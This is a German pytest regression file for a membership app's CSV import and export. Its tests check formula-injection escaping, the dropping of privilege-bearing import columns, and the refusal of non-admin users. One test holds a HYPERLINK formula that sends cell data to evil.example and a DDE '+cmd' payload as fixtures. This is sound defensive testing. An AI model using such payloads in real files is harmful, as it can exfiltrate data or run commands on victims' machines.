"""N11b — Regressionstests aus den Review-Proben.

Quelle: die Review-Proben zu N11 (Probe P7) fuer die Nacharbeit N11b. Diese Datei haelt die SICHERE Erwartung fest: was der
Reviewer als Luecke (rot) gezeigt hat, ist hier als Sollverhalten verankert.

Nicht hier: W1/W2 (Rueckholung eines ausgeschlossenen System Managers ueber
Import/Update, E-Mail-Dublette Gross/Klein gegen den Bestand) — eigene Karte
SEC-AUSSCHLUSS, in dieser Karte BEWUSST nicht angefasst.
"""

from __future__ import annotations

import csv
import io

import pytest

from diakronos_app.frappe_compat.session import set_user
from diakronos_app.models.core import HasRole, User
from diakronos_app.models.diakonos import Mitglied


def _konto(sess, email, rolle=None, *, mitglied=True, link=True, ausgeschlossen=False):
    sess.add(User(name=email, email=email, full_name=email, enabled=True))
    if rolle:
        sess.add(HasRole(name=f"HR-{email}-{rolle}", parent=email, parenttype="User",
                         parentfield="roles", role=rolle, docstatus=0, idx=1))
    if mitglied:
        sess.add(Mitglied(name=f"M-{email}", vorname=email, nachname="Test",
                          email=email, status="Mitglied", user=email if link else None,
                          ausgeschlossen=1 if ausgeschlossen else 0,
                          docstatus=0, idx=0))
    sess.commit()


def _aktiv(user):
    from diakronos_app.frappe_compat import benutzer_status
    benutzer_status.vergiss(user)
    return benutzer_status.ist_aktiv(user)


def _rollen(user):
    from diakronos_app.frappe_compat.permissions import get_roles
    return get_roles(user)


def _imp(csv_text, **kw):
    from diakronos_app.api.mitglieder import import_mitglieder_uebernehmen
    return import_mitglieder_uebernehmen(csv_text, **kw)


# P7 (SICHERE Erwartung): Formel-Einschleusung ueber Name und Telefon
def test_p7_formel_ueber_name_und_telefon_entschaerft(patched_db, fake_redis):
    """B1: Der Export entschaerft Name UND Telefon — keine Zelle beginnt mit
    einem Formelzeichen. Vorher (N11) lief `+HYPERLINK(...)` bzw.
    `+cmd|' /C calc'!A0` ungefiltert durch."""
    sess = patched_db()
    _konto(sess, "ma@x.org", "Mitgliederadministrator")
    sess.add(Mitglied(name="M-EVIL", vorname='+HYPERLINK("https://evil.example/?\"&E2;"Klick")+N("',
                      nachname='")', email="evil@x.org", status="Mitglied",
                      telefonnummer="+cmd|' /C calc'!A0", docstatus=0, idx=0))
    sess.commit()
    set_user("ma@x.org")
    from diakronos_app.api.mitglieder import exportiere_mitglieder_csv
    out = exportiere_mitglieder_csv(suche="", persoenliche_daten=True)["csv"]
    zeilen = list(csv.reader(io.StringIO(out), delimiter=";"))
    kopf = zeilen[0]
    evil = next(z for z in zeilen if "evil@x.org" in z)
    name, tel = evil[kopf.index("Name")], evil[kopf.index("Telefon")]
    assert not name.startswith("+"), f"Name-Zelle beginnt mit + (Formel): {name!r}"
    assert not tel.startswith("+cmd"), f"Telefon-Zelle beginnt mit +cmd (DDE): {tel!r}"
    # Und entschaerft ist sie wirklich (nicht nur gekuerzt).
    assert name.startswith("'+HYPERLINK"), name
    assert tel.startswith("'+cmd"), tel


# P1 (Regression, war gruen): Fremdspalten werden verworfen
def test_p1_fremdspalten_ignoriert(patched_db, fake_redis):
    sess = patched_db()
    _konto(sess, "ma@x.org", "Mitgliederadministrator")
    _konto(sess, "sm@x.org", "System Manager")
    set_user("ma@x.org")
    text = ("Vorname;Nachname;E-Mail;user;ausgeschlossen;Rollen;roles\n"
            "Neu;Person;neu@x.org;sm@x.org;1;System Manager;System Manager\n")
    from diakronos_app.api.mitglieder import import_mitglieder_vorschau
    sp = '{"vorname":"Vorname","nachname":"Nachname","email":"E-Mail","user":"user","ausgeschlossen":"ausgeschlossen","rollen":"Rollen"}'
    v = import_mitglieder_vorschau(text, spalten=sp)
    assert set(v["spalten"]) <= {"vorname", "nachname", "email"}
    r = _imp(text, spalten=sp)
    assert r["angelegt"] == 1
    sess.expire_all()
    m = sess.query(Mitglied).filter_by(email="neu@x.org").one()
    assert not m.user and not m.ausgeschlossen and m.status == "Mitglied"
    assert "System Manager" not in _rollen("neu@x.org")
    assert _aktiv("sm@x.org") and "System Manager" in _rollen("sm@x.org")


# P6 (Regression, war gruen): Nicht-Admin darf nicht importieren/exportieren
def test_p6_nicht_admin_abgewiesen(patched_db, fake_redis):
    sess = patched_db()
    _konto(sess, "mitglied@x.org", "Mitglied")
    set_user("mitglied@x.org")
    from diakronos_app.api import mitglieder

    for fn, arg in ((mitglieder.import_mitglieder_vorschau, "Vorname;Nachname\nA;B\n"),
                    (mitglieder.import_mitglieder_uebernehmen, "Vorname;Nachname\nA;B\n")):
        with pytest.raises(Exception) as ei:
            fn(arg)
        assert "PermissionError" in type(ei.value).__name__
    with pytest.raises(Exception) as ei:
        mitglieder.exportiere_mitglieder_csv(persoenliche_daten=True)
    assert "PermissionError" in type(ei.value).__name__
